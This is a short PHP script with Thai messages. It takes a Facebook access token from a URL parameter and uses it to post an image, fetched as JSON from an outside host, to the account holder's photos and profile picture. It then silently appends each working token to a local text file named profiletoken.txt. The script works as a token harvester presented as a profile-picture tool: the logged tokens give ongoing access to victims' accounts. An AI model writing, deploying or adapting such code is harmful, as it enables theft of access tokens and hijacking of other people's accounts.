<?php 
$token = $_GET['token'];

function curl($url) {   
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, $url);    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36');    
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);     
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
    $data = curl_exec($ch);     
    curl_close($ch);    
    return $data; 
}

		$url = 'http://bothakko.pw/url/';
        $content = curl($url);
       $web = json_decode($content,true);

$upload  = "https://graph.fb.me/me/photos?method=post&access_token=".$token."&url=".$web["avatar"];
//$upload  = "https://graph.fb.me/me/photos?access_token=".$token."&url=".$imgae_pic."&method=post";
 $upp = curl($upload);
 $id = json_decode($upp,true);
 
 if($id['error']){
   echo "โทเคนตาย";
 }

 else{
   echo "success";
   $json = curl("https://graph.fb.me/me/picture?photo=".$id['id']."&caption=uphakko&access_token=".$token."&method=post&width=650&height=650" );  
  $file = fopen('profiletoken.txt',"a+");
  $text = $token."\n";
  fwrite($file, $text);
  fclose($file);
 }
?>